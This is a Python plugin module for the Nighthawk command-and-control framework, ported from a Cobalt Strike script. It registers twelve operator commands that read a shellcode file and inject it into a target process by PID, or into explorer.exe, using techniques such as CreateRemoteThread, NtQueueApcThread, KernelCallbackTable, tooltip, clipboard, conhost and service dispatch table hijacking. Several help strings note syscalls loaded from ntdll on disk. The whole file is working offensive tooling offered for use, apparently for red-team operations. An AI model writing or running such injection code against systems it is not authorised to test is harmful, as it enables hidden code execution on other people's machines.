# =============================================================================
# Injection BOFs - Nighthawk Python Module
# Author: Dominic Chell (@domchell)
# Ported from Injection.cna
# =============================================================================


# ---------------------------------------------------------------------------
# Section 1: Helper Functions
# ---------------------------------------------------------------------------

def iload_bof(info, bof_name):
    """Load BOF binary for the agent's architecture."""
    arch = info.Agent.ProcessArch
    path = nighthawk.script_resource(f"{bof_name}/{bof_name}.{arch}.o")
    try:
        with open(path, "rb") as f:
            data = f.read()
        if len(data) == 0:
            nighthawk.console_write(CONSOLE_ERROR, f"BOF file is empty: {path}")
            return None
        return data
    except Exception:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not read BOF file: {path}")
        return None


def irun_bof(info, bof_name, packed_args=b""):
    """Load and execute a BOF in one call."""
    bof_data = iload_bof(info, bof_name)
    if bof_data is None:
        return
    arch = info.Agent.ProcessArch
    api.execute_bof(
        f"{bof_name}.{arch}.o", bof_data, packed_args,
        "go", True, 0, False, "", show_in_console=True,
    )


def iread_local_file(filepath):
    """Read a local file and return its bytes, or None on error."""
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        if len(data) == 0:
            nighthawk.console_write(CONSOLE_ERROR, f"File is empty: {filepath}")
            return None
        return data
    except Exception:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not read file: {filepath}")
        return None


# ---------------------------------------------------------------------------
# Section 2: Command Handlers
# ---------------------------------------------------------------------------

# --- PID + shellcode commands (pack format: ib) ---------------------------

def icmd_createremotethread(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: createremotethread <PID> [SHELLCODE_FILE]")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "createremotethread", p.getbuffer())


def icmd_setthreadcontext(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: setthreadcontext <PID> <SHELLCODE_FILE>")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "setthreadcontext", p.getbuffer())


def icmd_ntcreatethread(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: ntcreatethread <PID> <SHELLCODE_FILE>")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "ntcreatethread", p.getbuffer())


def icmd_ntqueueapcthread(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: ntqueueapcthread <PID> <SHELLCODE_FILE>")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "ntqueueapcthread", p.getbuffer())


def icmd_kernelcallbacktable(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: kernelcallbacktable <PID> <SHELLCODE_FILE>")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "kernelcallbacktable", p.getbuffer())


def icmd_tooltip(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: tooltip <PID> <SHELLCODE_FILE>")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "tooltip", p.getbuffer())


def icmd_clipboardinject(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: clipboardinject <PID> <SHELLCODE_FILE>")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "clipboardinject", p.getbuffer())


def icmd_conhost(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: conhost <PID> <SHELLCODE_FILE>")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "conhost", p.getbuffer())


def icmd_svcctrl(params, info):
    if len(params) < 1 or len(params) > 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: svcctrl <PID> <SHELLCODE_FILE>")
        return
    try:
        pid = int(params[0])
    except ValueError:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if pid < 0 or pid > 65535:
        nighthawk.console_write(CONSOLE_ERROR, "Invalid PID")
        return
    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR,
            "Shellcode file path is required")
        return
    shellcode = iread_local_file(params[1])
    if shellcode is None:
        return
    p = Packer()
    p.adduint32(pid)
    p.addbytes(shellcode)
    irun_bof(info, "svcctrl", p.getbuffer())


# --- Shellcode-only commands (pack format: b) -----------------------------

def icmd_uxsubclassinfo(params, info):
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: uxsubclassinfo <SHELLCODE_FILE>")
        return
    shellcode = iread_local_file(params[0])
    if shellcode is None:
        return
    p = Packer()
    p.addbytes(shellcode)
    irun_bof(info, "uxsubclassinfo", p.getbuffer())


def icmd_ctray(params, info):
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: ctray <SHELLCODE_FILE>")
        return
    shellcode = iread_local_file(params[0])
    if shellcode is None:
        return
    p = Packer()
    p.addbytes(shellcode)
    irun_bof(info, "ctray", p.getbuffer())


def icmd_dde(params, info):
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR,
            "Usage: dde <SHELLCODE_FILE>")
        return
    shellcode = iread_local_file(params[0])
    if shellcode is None:
        return
    p = Packer()
    p.addbytes(shellcode)
    irun_bof(info, "dde", p.getbuffer())


# ---------------------------------------------------------------------------
# Section 3: Command Registration
# ---------------------------------------------------------------------------

nighthawk.register_command(icmd_createremotethread, "createremotethread",
    "Injects shellcode into a process using the CreateRemoteThread technique",
    "createremotethread injection technique",
    "createremotethread <PID> <SHELLCODE_FILE>",
    "createremotethread 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_setthreadcontext, "setthreadcontext",
    "Injects shellcode into a process using the SetThreadContext technique",
    "setthreadcontext injection technique",
    "setthreadcontext <PID> <SHELLCODE_FILE>",
    "setthreadcontext 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_ntcreatethread, "ntcreatethread",
    "Injects shellcode into a process using NtCreateThread with syscalls loaded from ntdll on disk",
    "ntcreatethread injection technique",
    "ntcreatethread <PID> <SHELLCODE_FILE>",
    "ntcreatethread 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_ntqueueapcthread, "ntqueueapcthread",
    "Injects shellcode into a process using NtQueueApcThread with syscalls loaded from ntdll on disk",
    "ntqueueapcthread injection technique",
    "ntqueueapcthread <PID> <SHELLCODE_FILE>",
    "ntqueueapcthread 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_kernelcallbacktable, "kernelcallbacktable",
    "Injects shellcode into a process using the KernelCallbackTable technique. Can only target processes that handle window messages (GUIs)",
    "kernelcallbacktable injection technique",
    "kernelcallbacktable <PID> <SHELLCODE_FILE>",
    "kernelcallbacktable 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_tooltip, "tooltip",
    "Injects shellcode into a process using the tooltip technique with syscalls from ntdll on disk. Can only target processes with tooltip windows, e.g. explorer.exe",
    "tooltip injection technique",
    "tooltip <PID> <SHELLCODE_FILE>",
    "tooltip 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_clipboardinject, "clipboardinject",
    "Injects shellcode into a process using the clipboard injection technique with syscalls from ntdll on disk. Targets processes with clipboard windows, e.g. explorer.exe, vmtoolsd.exe",
    "clipboardinject injection technique",
    "clipboardinject <PID> <SHELLCODE_FILE>",
    "clipboardinject 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_conhost, "conhost",
    "Injects shellcode using the conhost technique with syscalls from ntdll on disk. Targets console applications with a conhost.exe child process. Does not work on Windows 7",
    "conhost injection technique (targets conhost.exe only)",
    "conhost <PID> <SHELLCODE_FILE>",
    "conhost 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_svcctrl, "svcctrl",
    "Injects shellcode by overwriting a service dispatch table. Target process must host services, e.g. svchost.exe or spoolsrv.exe",
    "svcctrl injection technique",
    "svcctrl <PID> <SHELLCODE_FILE>",
    "svcctrl 1234 C:\\shellcode.bin")

nighthawk.register_command(icmd_uxsubclassinfo, "uxsubclassinfo",
    "Injects shellcode into explorer.exe using the UxSubclassInfo technique with syscalls from ntdll on disk. No PID needed — targets explorer only",
    "uxsubclassinfo injection technique (targets explorer.exe only)",
    "uxsubclassinfo <SHELLCODE_FILE>",
    "uxsubclassinfo C:\\shellcode.bin")

nighthawk.register_command(icmd_ctray, "ctray",
    "Injects shellcode into explorer.exe using the ctray injection technique with syscalls from ntdll on disk. No PID needed — targets explorer only",
    "ctray injection technique (targets explorer.exe only)",
    "ctray <SHELLCODE_FILE>",
    "ctray C:\\shellcode.bin")

nighthawk.register_command(icmd_dde, "dde",
    "Injects shellcode into explorer.exe using the DDE injection technique with syscalls from ntdll on disk. No PID needed — targets explorer only. WARNING: shellcode executes FOUR times",
    "dde injection technique (targets explorer.exe only)",
    "dde <SHELLCODE_FILE>",
    "dde C:\\shellcode.bin")
